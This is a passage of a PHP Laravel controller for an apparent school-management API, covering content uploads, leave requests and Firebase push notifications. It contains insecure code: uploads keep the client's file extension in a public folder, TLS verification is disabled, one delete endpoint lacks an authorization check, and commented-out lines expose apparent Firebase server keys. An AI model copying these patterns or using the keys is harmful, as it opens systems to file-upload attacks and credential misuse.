            ->join('aramisc_leave_types', 'aramisc_leave_types.id', '=', 'aramisc_leave_defines.type_id')
            ->where('aramisc_leave_defines.school_id',$school_id)->get();
        $status = 'P for Pending, A for Approve, R for reject';
        $data = [];
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['leave_list'] = $leave_list->toArray();
            $data['status'] = $status;
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function uploadContent(Request $request)
    {


        $input = $request->all();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'content_title' => "required",
                'content_type' => "required",
                'upload_date' => "required",
                'description' => "required"


            ]);
        }
        //as assignment, st study material, sy sullabus, ot others download

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }
        if (empty($request->input('available_for'))) {

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', 'Content Receiver not selected');
            }
        }


        $fileName = "";
        if ($request->file('attach_file') != "") {
            $file = $request->file('attach_file');
            $fileName = $request->input('created_by') . time() . "." . $file->getClientOriginalExtension();
            $file->move('public/uploads/upload_contents/', $fileName);
            $fileName = 'public/uploads/upload_contents/' . $fileName;
        }

        $uploadContents = new AramiscTeacherUploadContent();
        $uploadContents->content_title = $request->input('content_title');
        $uploadContents->content_type = $request->input('content_type');
        $uploadContents->source_url = $request->input('source_url');
        $uploadContents->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();


        if ($request->input('available_for') == 'admin') {
            $uploadContents->available_for_admin = 1;
        } elseif ($request->input('available_for') == 'student') {
            if (!empty($request->input('all_classes'))) {
                $uploadContents->available_for_all_classes = 1;
            } else {
                $uploadContents->class = $request->input('class');
                $uploadContents->section = $request->input('section');
            }
        }



        $uploadContents->upload_date = date('Y-m-d', strtotime($request->input('upload_date')));
        $uploadContents->description = $request->input('description');
        $uploadContents->upload_file = $fileName;
        $uploadContents->created_by = $request->input('created_by');
        $results = $uploadContents->save();


        if ($request->input('content_type') == 'as') {
            $purpose = 'assignment';
        } elseif ($request->input('content_type') == 'st') {
            $purpose = 'Study Material';
        } elseif ($request->input('content_type') == 'sy') {
            $purpose = 'Syllabus';
        } elseif ($request->input('content_type') == 'ot') {
            $purpose = 'Others Download';
        }


        if ($request->input('available_for') == 'admin') {
            $roles = AramiscRole::where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 9)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            foreach ($roles as $role) {
                $staffs = AramiscStaff::where('role_id', $role->id)->get();
                foreach ($staffs as $staff) {
                    $notification = new AramiscNotification;
                    $notification->user_id = $staff->id;
                    $notification->role_id = $role->id;
                    $notification->school_id = Auth::user()->school_id;
                    $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                    $notification->date = date('Y-m-d');
                    $notification->message = $purpose . ' '.app('translator')->get('common.updated');
                    $notification->save();
                    $user=User::find($notification->user_id);
                    Notification::send($user, new StudyMeterialCreatedNotification($notification));
                }
            }
        }
        if ($request->input('available_for') == 'student') {
            if (!empty($request->input('all_classes'))) {
                $students = AramiscStudent::select('id')->get();
                foreach ($students as $student) {
                    $notification = new AramiscNotification;
                    $notification->user_id = $student->id;
                    $notification->role_id = 2;
                    $notification->school_id = Auth::user()->school_id;
                    $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                    $notification->date = date('Y-m-d');
                    $notification->message = $purpose . ' '.app('translator')->get('common.updated');
                    $notification->save();
                    $user=User::find($notification->user_id);
                    if($user){
                        Notification::send($user, new StudyMeterialCreatedNotification($notification));
                    }
                    
                }
            } else {
                $students = AramiscStudent::select('id')->where('class_id', $request->input('class'))->where('section_id', $request->input('section'))->get();
                foreach ($students as $student) {
                    $notification = new AramiscNotification;
                    $notification->user_id = $student->id;
                    $notification->role_id = 2;
                    $notification->school_id = Auth::user()->school_id;
                    $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                    $notification->date = date('Y-m-d');
                    $notification->message = $purpose . ' '.app('translator')->get('common.updated');
                    $notification->save();
                    $user=User::find($notification->user_id);
                    if($user){
                        Notification::send($user, new StudyMeterialCreatedNotification($notification));
                    }
                    
                }
            }
        }


        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $data = '';

            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_uploadContent(Request $request)
    {

        $input = $request->all();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'content_title' => "required",
                'content_type' => "required",
                'upload_date' => "required",
                'description' => "required",
                'school_id' => "required",


            ]);
        }
        //as assignment, st study material, sy sullabus, ot others download

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }
        if (empty($request->input('available_for'))) {

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', 'Content Receiver not selected');
            }
        }


        $fileName = "";
        if ($request->file('attach_file') != "") {
            $file = $request->file('attach_file');
            $fileName = $request->input('created_by') . time() . "." . $file->getClientOriginalExtension();
            $file->move('public/uploads/upload_contents/', $fileName);
            $fileName = 'public/uploads/upload_contents/' . $fileName;
        }


        $uploadContents = new AramiscTeacherUploadContent();
        $uploadContents->content_title = $request->input('content_title');
        $uploadContents->content_type = $request->input('content_type');
        $uploadContents->source_url = $request->input('source_url');


        if ($request->input('available_for') == 'admin') {
            $uploadContents->available_for_admin = 1;
        } elseif ($request->input('available_for') == 'student') {
            if (!empty($request->input('all_classes'))) {
                $uploadContents->available_for_all_classes = 1;
            } else {
                $uploadContents->class = $request->input('class');
                $uploadContents->section = $request->input('section');
            }
        }



        $uploadContents->upload_date = date('Y-m-d', strtotime($request->input('upload_date')));
        $uploadContents->description = $request->input('description');
        $uploadContents->upload_file = $fileName;
        $uploadContents->school_id = $request->input('school_id');
        $uploadContents->academic_id = AramiscAcademicYear::API_ACADEMIC_YEAR($uploadContents->school_id);
        $uploadContents->created_by = $request->input('created_by');
        $results = $uploadContents->save();


        if ($request->input('content_type') == 'as') {
            $purpose = 'assignment';
        } elseif ($request->input('content_type') == 'st') {
            $purpose = 'Study Material';
        } elseif ($request->input('content_type') == 'sy') {
            $purpose = 'Syllabus';
        } elseif ($request->input('content_type') == 'ot') {
            $purpose = 'Others Download';
        }


        if ($request->input('available_for') == 'admin') {
            $roles = AramiscRole::where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 9)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            foreach ($roles as $role) {
                $staffs = AramiscStaff::where('role_id', $role->id)->get();
                foreach ($staffs as $staff) {
                    $notification = new AramiscNotification;
                    $notification->user_id = $staff->id;
                    $notification->role_id = $role->id;
                    $notification->school_id = Auth::user()->school_id;
                    $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                    $notification->date = date('Y-m-d');
                    $notification->message = $purpose . ' updated';
                    $notification->save();
                }
            }
        }
        if ($request->input('available_for') == 'student') {
            if (!empty($request->input('all_classes'))) {
                $students = AramiscStudent::select('id')->get();
                foreach ($students as $student) {
                    $notification = new AramiscNotification;
                    $notification->user_id = $student->id;
                    $notification->role_id = 2;
                    $notification->school_id = Auth::user()->school_id;
                    $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                    $notification->date = date('Y-m-d');
                    $notification->message = $purpose . ' updated';
                    $notification->save();
                }
            } else {
                $students = AramiscStudent::select('id')->where('class_id', $request->input('class'))->where('section_id', $request->input('section'))->get();
                foreach ($students as $student) {
                    $notification = new AramiscNotification;
                    $notification->user_id = $student->id;
                    $notification->role_id = 2;
                    $notification->school_id = Auth::user()->school_id;
                    $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
                    $notification->date = date('Y-m-d');
                    $notification->message = $purpose . ' updated';
                    $notification->save();
                }
            }
        }

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $data = '';

            return ApiBaseMethod::sendResponse($data, null);
        }
    }


    public function pendingLeave(Request $request)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $pendingRequest = AramiscLeaveRequest::with('leaveDefine','staffs','student')->where('aramisc_leave_requests.active_status', 1)
                                ->where('aramisc_leave_requests.approve_status', '=', 'P')
                                ->join('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                                ->select('aramisc_leave_requests.id', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'type', 'approve_status')
                                ->where('aramisc_leave_requests.school_id', Auth::user()->school_id)
                                ->get();
            $data = [];
            $data['pending_request'] = $pendingRequest->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
        try {

            $user = Auth::user();
            $staff = AramiscStaff::where('user_id', Auth::user()->id)->first();
            if (Auth()->user()->role_id == 1) {
                $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'A']])->get();
            } else {
                $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'A'], ['staff_id', '=', $staff->id]])->get();
            }
            $leave_types = AramiscLeaveType::where('active_status', 1)->get();
            $roles = AramiscRole::where('id', '!=', 1)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $pendingRequest = AramiscLeaveRequest::where('aramisc_leave_requests.active_status', 1)
                ->select('aramisc_leave_requests.id', 'full_name', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'aramisc_leave_types.type', 'approve_status')
                ->join('aramisc_leave_defines', 'aramisc_leave_requests.leave_define_id', '=', 'aramisc_leave_defines.id')
                ->join('aramisc_staffs', 'aramisc_leave_requests.staff_id', '=', 'aramisc_staffs.id')
                ->leftjoin('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                ->where('aramisc_leave_requests.school_id', Auth::user()->school_id)
                ->where('aramisc_leave_requests.approve_status', '=', 'P')
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['pending_request'] = $pendingRequest->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.approveLeaveRequest', compact('apply_leaves', 'leave_types', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_pendingLeave(Request $request, $school_id)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $pendingRequest = AramiscLeaveRequest::with('leaveDefine','staffs','student')->where('aramisc_leave_requests.active_status', 1)
                                ->where('aramisc_leave_requests.approve_status', '=', 'P')
                                ->join('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                                ->select('aramisc_leave_requests.id', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'type', 'approve_status')
                                ->where('aramisc_leave_requests.school_id', Auth::user()->school_id)
                                ->get();
            $data = [];
            $data['pending_request'] = $pendingRequest->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
        try {

            $user = Auth::user();
            $staff = AramiscStaff::where('user_id', Auth::user()->id)->first();
            if (Auth()->user()->role_id == 1) {
                $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'A']])->get();
            } else {
                $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'A'], ['staff_id', '=', $staff->id]])->get();
            }
            $leave_types = AramiscLeaveType::where('active_status', 1)->get();
            $roles = AramiscRole::where('id', '!=', 1)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $pendingRequest = AramiscLeaveRequest::where('aramisc_leave_requests.active_status', 1)
                ->select('aramisc_leave_requests.id', 'full_name', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'aramisc_leave_types.type', 'approve_status')
                ->join('aramisc_leave_defines', 'aramisc_leave_requests.leave_define_id', '=', 'aramisc_leave_defines.id')
                ->join('aramisc_staffs', 'aramisc_leave_requests.staff_id', '=', 'aramisc_staffs.id')
                ->leftjoin('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                ->where('aramisc_leave_requests.school_id', Auth::user()->school_id)
                ->where('aramisc_leave_requests.approve_status', '=', 'P')
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['pending_request'] = $pendingRequest->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.approveLeaveRequest', compact('apply_leaves', 'leave_types', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function approvedLeave(Request $request)
    {

        try {
            $approved_request = AramiscLeaveRequest::where('aramisc_leave_requests.active_status', 1)
                ->select('aramisc_leave_requests.id', 'full_name', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'type', 'approve_status')
                ->join('aramisc_leave_defines', 'aramisc_leave_requests.leave_define_id', '=', 'aramisc_leave_defines.id')
                ->join('aramisc_staffs', 'aramisc_leave_requests.staff_id', '=', 'aramisc_staffs.id')
                ->join('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                ->where('aramisc_leave_requests.approve_status', '=', 'A')
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['approved_request'] = $approved_request->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_approvedLeave(Request $request,$school_id)
    {

        try {
            $approved_request = AramiscLeaveRequest::with('leaveDefine','staffs','student')->where('aramisc_leave_requests.active_status', 1)
                                ->where('aramisc_leave_requests.approve_status', '=', 'A')
                                ->join('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                                ->select('aramisc_leave_requests.id', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'type', 'approve_status')
                                ->where('aramisc_leave_requests.school_id', Auth::user()->school_id)
                                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['approved_request'] = $approved_request->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function rejectLeave(Request $request)
    {
        try {
            $reject_request = AramiscLeaveRequest::with('leaveDefine','staffs','student')->where('aramisc_leave_requests.active_status', 1)
                                ->where('aramisc_leave_requests.approve_status', '=', 'R')
                                ->join('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                                ->select('aramisc_leave_requests.id', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'type', 'approve_status')
                                ->where('aramisc_leave_requests.school_id', Auth::user()->school_id)
                                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['reject_request'] = $reject_request->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_rejectLeave(Request $request, $school_id)
    {
        try {
            $reject_request = AramiscLeaveRequest::where('aramisc_leave_requests.active_status', 1)
                ->select('aramisc_leave_requests.id', 'full_name', 'apply_date', 'leave_from', 'leave_to', 'reason', 'file', 'type', 'approve_status')
                ->join('aramisc_leave_defines', 'aramisc_leave_requests.leave_define_id', '=', 'aramisc_leave_defines.id')
                ->join('aramisc_staffs', 'aramisc_leave_requests.staff_id', '=', 'aramisc_staffs.id')
                ->join('aramisc_leave_types', 'aramisc_leave_requests.type_id', '=', 'aramisc_leave_types.id')
                ->where('aramisc_leave_requests.approve_status', '=', 'R')

                ->where('aramisc_leave_requests.school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['reject_request'] = $reject_request->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function apply_Leave(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'staff_id' => "required",
                'reason' => "required",

            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        try {
            $fileName = "";
            if ($request->file('attach_file') != "") {
                $file = $request->file('attach_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName = 'public/uploads/leave_request/' . $fileName;
            }

            $apply_leave = new AramiscLeaveRequest();
            $apply_leave->staff_id = $request->input('staff_id');
            $apply_leave->role_id = 4;
            $apply_leave->apply_date = date('Y-m-d');
            $apply_leave->leave_define_id = $request->input('leave_type');
            $apply_leave->type_id = $request->input('leave_type');
            $apply_leave->leave_from = $request->input('leave_from');
            $apply_leave->leave_to = $request->input('leave_to');
            $apply_leave->approve_status = 'P';
            $apply_leave->reason = $request->input('reason');
            if ($fileName != "") {
                $apply_leave->file = $fileName;
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                $result = $apply_leave->save();

                return ApiBaseMethod::sendResponse($result, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_apply_Leave(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'staff_id' => "required",
                'reason' => "required",
                'school_id' => "required",

            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        try {
            $fileName = "";
            if ($request->file('attach_file') != "") {
                $file = $request->file('attach_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName = 'public/uploads/leave_request/' . $fileName;
            }

            $apply_leave = new AramiscLeaveRequest();
            $apply_leave->staff_id = $request->input('staff_id');
            $apply_leave->role_id = 4;
            $apply_leave->apply_date = date('Y-m-d');
            $apply_leave->leave_define_id = $request->input('leave_type');
            $apply_leave->type_id = $request->input('leave_type');
            $apply_leave->leave_from = $request->input('leave_from');
            $apply_leave->leave_to = $request->input('leave_to');
            $apply_leave->approve_status = 'P';
            $apply_leave->reason = $request->input('reason');
            $apply_leave->school_id = $request->input('school_id');
            if ($fileName != "") {
                $apply_leave->file = $fileName;
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                $result = $apply_leave->save();

                return ApiBaseMethod::sendResponse($result, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function updateLeave(Request $request)
    {

        try {
            $leave_request_data = AramiscLeaveRequest::find($request->id);
            $staff_id = $leave_request_data->staff_id;
            $role_id = $leave_request_data->role_id;
            $leave_request_data->approve_status = $request->status;
            $result = $leave_request_data->save();

            $staff= User::find($staff_id);

            if($staff && $request->status == "A"){
                if($staff->role_id == 2 || $staff->role_id == 2){
                    $compact['slug'] = 'student';
                    $compact['user_email'] = $staff->student->email;
                    $compact['student_name'] = $staff->student->full_name;
                    @send_sms($staff->student->mobile, 'student_leave_approve', $compact);

                    $compact['slug'] = 'parent';
                    $compact['user_email'] = $staff->student->parents->guardians_email;
                    $compact['parent_name'] = $staff->student->parents->guardians_name;
                    @send_sms($staff->student->parents->guardians_mobile, 'parent_leave_approve_for_student', $compact);
                }else{
                    $compact['slug'] = 'staff';
                    $compact['user_email'] = $staff->staff->email;
                    $compact['staff_name'] = $staff->full_name;
                    @send_sms($staff->staff->mobile, 'staff_leave_approve', $compact);
                }
            }


            $notification = new AramiscNotification;
            $notification->user_id = $staff_id;
            $notification->role_id = $role_id;
            $notification->school_id = Auth::user()->school_id;
            $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $notification->date = date('Y-m-d');
            if($request->approve_status == 'A'){
                $message = app('translator')->get('leave.leave_request_approved');
            }else if($request->approve_status == 'C'){
                $message = app('translator')->get('leave.leave_request_canceled');;
            } else{
                $message = app('translator')->get('leave.leave_request_pending');;
            }
            $notification->message = $message;
            $notification->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = '';
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_updateLeave(Request $request,$school_id)
    {

        try {
            $leave_request_data = AramiscLeaveRequest::where('school_id',$school_id)->find($request->id);
            $staff_id = $leave_request_data->staff_id;
            $role_id = $leave_request_data->role_id;
            $leave_request_data->approve_status = $request->status;
            $result = $leave_request_data->save();

            $staff= User::find($staff_id);

            if($staff && $request->status == "A"){
                if($staff->role_id == 2 || $staff->role_id == 2){
                    $compact['slug'] = 'student';
                    $compact['user_email'] = $staff->student->email;
                    $compact['student_name'] = $staff->student->full_name;
                    @send_sms($staff->student->mobile, 'student_leave_approve', $compact);

                    $compact['slug'] = 'parent';
                    $compact['user_email'] = $staff->student->parents->guardians_email;
                    $compact['parent_name'] = $staff->student->parents->guardians_name;
                    @send_sms($staff->student->parents->guardians_mobile, 'parent_leave_approve_for_student', $compact);
                }else{
                    $compact['slug'] = 'staff';
                    $compact['user_email'] = $staff->staff->email;
                    $compact['staff_name'] = $staff->full_name;
                    @send_sms($staff->staff->mobile, 'staff_leave_approve', $compact);
                }
            }


            $notification = new AramiscNotification;
            $notification->user_id = $staff_id;
            $notification->role_id = $role_id;
            $notification->school_id = Auth::user()->school_id;
            $notification->academic_id = AramiscAcademicYear::API_ACADEMIC_YEAR(Auth::user()->school_id);
            $notification->date = date('Y-m-d');
            if($request->approve_status == 'A'){
                $message = app('translator')->get('leave.leave_request_approved');
            }else if($request->approve_status == 'C'){
                $message = app('translator')->get('leave.leave_request_canceled');;
            } else{
                $message = app('translator')->get('leave.leave_request_pending');;
            }
            $notification->message = $message;
            $notification->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = '';
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function delete_Content(Request $request, $id)
    {
        $content = DB::table('aramisc_teacher_upload_contents')->where('id', $id)->delete();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = '';
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function groupToken(Request $request)
    {
        try {
            $users = User::where('role_id', $request->id)->get();
            foreach ($users as $user) {

                // SEND PUSHUP NOTIFICATION
                if ($user->device_token != ''){
                    $firebaseService = new FirebasePushService();
                    $firebaseService->sendToToken($user->device_token, $_REQUEST['title'], $_REQUEST['body']);
                }

                if ($user->notificationToken != '') {

//                    define('API_ACCESS_KEY', 'AAAA5ZKAL1I:APA91bFSF0aIpn2uayU2SJ7Ov8Krc3xlQVqwEBYt0FOyDxswMgDVOq7hKoOkRVm5gGd_YxWzwe_kl-POUQE13twf65yxpd3dRffEjNqaXTdl7x-lCCkIY7YYOD4pVjaHWNazHJSgB6xp');
                    define('API_ACCESS_KEY', Cache::get('firebase_access_token'));
                    //   $registrationIds = ;
                    #prep the bundle
                    $msg = array(
                        'body'     => $_REQUEST['body'],
                        'title'    => $_REQUEST['title'],

                    );
                    $fields = array(
                        'to'        => $user->notificationToken,
                        'notification'    => $msg
                    );


                    $headers = array(
                        'Authorization: key=' . API_ACCESS_KEY,
                        'Content-Type: application/json'
                    );
                    #Send Reponse To FireBase Server
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
                    $result = curl_exec($ch);
                    echo $result;
                    curl_close($ch);
                }
            }
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = '';
                return ApiBaseMethod::sendResponse($data, null);
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $e = '';
                    return ApiBaseMethod::sendError($e);
                }
            }
        } catch (\Exception $e) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $e = '';
                return ApiBaseMethod::sendError($e);
            }
        }
    }
    public function saas_groupToken(Request $request, $school_id)
    {
        try {
            $users = User::where('role_id', $request->id)->where('school_id',$school_id)->get();
            foreach ($users as $user) {

                // SEND PUSHUP NOTIFICATION
                if ($user->device_token != ''){
                    $firebaseService = new FirebasePushService();
                    $firebaseService->sendToToken($user->device_token, $_REQUEST['title'], $_REQUEST['body']);
                }

                if ($user->notificationToken != '') {

                    //echo 'Aramisc Edu';
//                    define('API_ACCESS_KEY', 'AAAA5ZKAL1I:APA91bFSF0aIpn2uayU2SJ7Ov8Krc3xlQVqwEBYt0FOyDxswMgDVOq7hKoOkRVm5gGd_YxWzwe_kl-POUQE13twf65yxpd3dRffEjNqaXTdl7x-lCCkIY7YYOD4pVjaHWNazHJSgB6xp');
                    define('API_ACCESS_KEY', Cache::get('firebase_access_token'));
                    //   $registrationIds = ;
                    #prep the bundle
                    $msg = array(
                        'body'     => $_REQUEST['body'],
                        'title'    => $_REQUEST['title'],

                    );
                    $fields = array(
                        'to'        => $user->notificationToken,
                        'notification'    => $msg
                    );


                    $headers = array(
                        'Authorization: key=' . API_ACCESS_KEY,
                        'Content-Type: application/json'
                    );
                    #Send Reponse To FireBase Server
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
                    $result = curl_exec($ch);
                    echo $result;
                    curl_close($ch);
                }
            }
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = '';
                return ApiBaseMethod::sendResponse($data, null);
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $e = '';
                    return ApiBaseMethod::sendError($e);
                }
            }
        } catch (\Exception $e) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $e = '';
                return ApiBaseMethod::sendError($e);
            }
        }
    }

    public function flutterGroupToken(Request $request)
    {
        try {
            $users = User::where('role_id', $request->id)->get();
            foreach ($users as $user) {

                // SEND PUSHUP NOTIFICATION
                if ($user->device_token != ''){
                    $firebaseService = new FirebasePushService();
                    $firebaseService->sendToToken($user->device_token, $_REQUEST['title'], $_REQUEST['body']);
                }

                if ($user->notificationToken != '') {

                    //echo 'Aramisc Edu';
//                    define('API_ACCESS_KEY', 'AAAAFyQhhks:APA91bGJqDLCpuPgjodspo7Wvp1S4yl3jYwzzSxet_sYQH9Q6t13CtdB_EiwD6xlVhNBa6RcHQbBKCHJ2vE452bMAbmdABsdPriJy_Pr9YvaM90yEeOCQ6VF7JEQ501Prhnu_2bGCPNp');
                    define('API_ACCESS_KEY', Cache::get('firebase_access_token'));
                    //   $registrationIds = ;
                    #prep the bundle
                    $msg = array(
                        'body'     => $_REQUEST['body'],
                        'title'    => $_REQUEST['title'],

                    );
                    $fields = array(
                        'to'        => $user->notificationToken,
                        'notification'    => $msg
                    );


                    $headers = array(
                        'Authorization: key=' . API_ACCESS_KEY,
                        'Content-Type: application/json'
                    );
                    #Send Reponse To FireBase Server
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
                    $result = curl_exec($ch);
                    echo $result;
                    curl_close($ch);
                }
            }
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = '';
                return ApiBaseMethod::sendResponse($data, null);
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = '';
                    return ApiBaseMethod::sendError($data);
                }
            }
        } catch (\Exception $e) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = '';
                return ApiBaseMethod::sendError($data);
            }
        }
    }

    public function systemDisbale(Request $request){
        $input = $request->all();
